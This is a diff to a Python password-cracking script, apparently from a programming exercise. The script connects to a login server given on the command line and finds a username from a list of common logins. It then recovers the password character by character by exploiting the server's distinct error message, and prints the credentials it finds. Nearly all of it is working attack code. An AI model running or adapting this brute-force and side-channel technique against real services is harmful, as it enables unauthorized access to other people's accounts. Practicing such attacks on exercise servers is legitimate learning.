@@ -1,6 +1,7 @@
 import sys
 import socket
 import itertools
+import json
 
 
 def get_bruce_force():
@@ -10,6 +11,15 @@ def get_bruce_force():
         pass_dict.append(c)
         for p in itertools.product(*pass_dict):
             yield ''.join(p)
+
+
+def get_bruce_force_1ch():
+    c = ''.join([chr(c) for c in range(97, 97 + 26)] + [str(c) for c in range(10)]
+                + [chr(c) for c in range(65, 65 + 26)])
+    pass_dict = []
+    pass_dict.append(c)
+    for p in itertools.product(*pass_dict):
+        yield ''.join(p)
 
 
 def get_pass_variations2(word):
@@ -28,23 +38,39 @@ def get_dict_pass(p_file):
             yield pv
 
 
-password = ''
+login = ''
+password = ' '
+pass_ok = 0
 
 
 args = sys.argv
 conn = socket.socket()
 conn.connect((args[1], int(args[2])))
 
-pass_file = open('../passwords.txt', 'r')
-pass_to_try_gen = get_dict_pass(pass_file)
-while not password:
-    pass_to_try = next(pass_to_try_gen)
-    conn.send(pass_to_try.encode())
-    serv_resp = conn.recv(50).decode()
-    if serv_resp == 'Connection success!':
-        password = pass_to_try
-        print(password)
-        break
+common_logins = open('logins.txt', 'r')
+login_to_try_gen = get_dict_pass(common_logins)
+while not login:
+    login_to_try = next(login_to_try_gen)
+    conn.send(f'{{"login": "{login_to_try}", "password": "{password}"}}'.encode())
+    serv_resp = json.loads(conn.recv(1024).decode())
+    if serv_resp['result'] == 'Wrong password!':
+        login = login_to_try
 
-pass_file.close()
+common_logins.close()
+
+password = ''
+pass_to_try_gen = get_bruce_force_1ch()
+while not pass_ok:
+    pass_to_try = next(pass_to_try_gen)
+    conn.send(f'{{"login": "{login}", "password": "{password + pass_to_try}"}}'.encode())
+    serv_resp = json.loads(conn.recv(1024).decode())
+    if serv_resp['result'] == 'Exception happened during login':
+        password += pass_to_try
+        pass_to_try_gen = get_bruce_force_1ch()
+    elif serv_resp['result'] == 'Connection success!':
+        pass_ok = 1
+        password += pass_to_try
+
+
+print(f'{{"login": "{login}", "password": "{password}"}}')
 conn.close()
